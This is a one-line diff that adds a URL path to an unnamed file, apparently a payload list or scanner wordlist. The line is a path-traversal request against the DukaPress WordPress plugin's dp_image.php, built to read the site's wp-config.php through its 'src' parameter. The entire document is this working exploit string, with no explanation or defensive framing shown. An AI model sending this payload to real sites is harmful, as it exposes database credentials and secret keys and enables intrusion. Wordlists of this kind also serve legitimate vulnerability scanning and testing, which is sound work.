@@ -1,0 +1,1 @@
+/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php
